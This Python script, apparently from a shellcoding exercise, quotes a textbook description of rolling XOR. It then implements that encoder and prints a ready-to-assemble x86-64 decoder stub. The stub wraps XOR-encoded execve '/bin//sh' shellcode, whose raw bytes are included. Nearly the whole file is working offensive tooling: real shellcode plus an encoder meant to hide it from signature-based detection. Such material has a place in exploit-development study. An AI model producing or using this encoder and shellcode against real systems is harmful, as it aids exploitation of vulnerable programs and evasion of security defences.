"""
An example of the rolling XOR algorithm is as
follows. Suppose the message payload is the sequence of bytes “0x11 0x2e 0x54 0x9d”.
The first byte is left as is in the cipher text.
The second byte is encrypted by XORing the
second byte of the original message with the first byte of the cipher text: 0x11 XOR 0x2e
= 0x3f. This is the second byte of the cipher text. The third byte is encrypted by
XORing the unencrypted third byte of the original message with the second byte of the
cipher text: 0x3f XOR 0x54 = 0x6B. Finally, 0x6B, the third byte of the cipher text, is
XORed with the last byte of the original message. The cipher text is “0x11 0x3f 0x6B
0xF6”.

Decryption is the opposite of encryption. First, the last byte of the cipher text is
XORed with the preceding byte of the cipher text: 0xF6 XOR 0x6B = 0x9d. This
recovers the last byte of the original message. This process is repeated for all the
remaining bytes in the cipher text except the first byte, which was not encrypted.
There are a couple of interesting observations about this algorithm. First, in order
to determine the value of a specific byte in the original message, it is not necessary to
decrypt the entire message. For example, to determine the original value of the second
byte, XOR it with the preceding byte: 0x3F XOR 0x11 = 0x2E. It is not necessary to
decrypt the third and fourth bytes before jumping to this step.
"""

import textwrap


def rolling_xor(data: bytes, decrypt=False) -> bytes:
    """ Perform a rolling xor encryption scheme on `data`.

    :param data: bytes object; data to be [en,de]coded
    :param decrypt: boolean, decrypt previously xor'd data
    :return: bytes object
    """
    data = bytearray(data)

    if decrypt:
        data.reverse()
        cipher_stream = bytearray()

        for i, byte in enumerate(data):
            if i == len(data) - 1:
                cipher_stream.append(data[i])  # last byte doesn't need xor'd
            else:
                cipher_stream.append(data[i] ^ data[i + 1])

        cipher_stream.reverse()
    else:
        cipher_stream = bytearray([data.pop(0)])  # first byte left as is in the ciphertext
        for i, byte in enumerate(data):
            cipher_stream.append(byte ^ cipher_stream[i])
    return bytes(cipher_stream)


def print_assembly(shellcode: bytes) -> None:
    """ Print a complete decoder stub with shellcode ready for assembly and linking.

    :param shellcode: bytes object; used as shellcode in the assembly generated
    :return: None
    """
    template = f"""\
    global _start

    section .text
    _start:
        jmp short get_address       ; jmp-call-pop for shellcode address
    
    decoder:
        pop rdi                     ; address to encoded_shellcode
        push {len(shellcode) - 1}    
        pop rcx                     ; rolling-xor requires one less xor instruction 
        xor eax, eax                ; than the length of the shellcode
    
    decode:
        mov eax, [rdi + rcx - 1]    ; first byte in xor (earlier of the two)
        xor byte [rdi + rcx], al    ; xor the byte above with the one that directly follows 
        loop decode                 ; the decoder works backwards 
    
    jmp short encoded_shellcode     ; do the thing
    
    get_address:
        call decoder
        encoded_shellcode: db {','.join(hex(x) for x in shellcode)}
    """
    print(textwrap.dedent(template))


if __name__ == '__main__':
    exec_shell_shellcode = (  # execve /bin//sh
        b"\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
        b"\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
    )

    encoded_shellcode = rolling_xor(exec_shell_shellcode)

    print_assembly(encoded_shellcode)

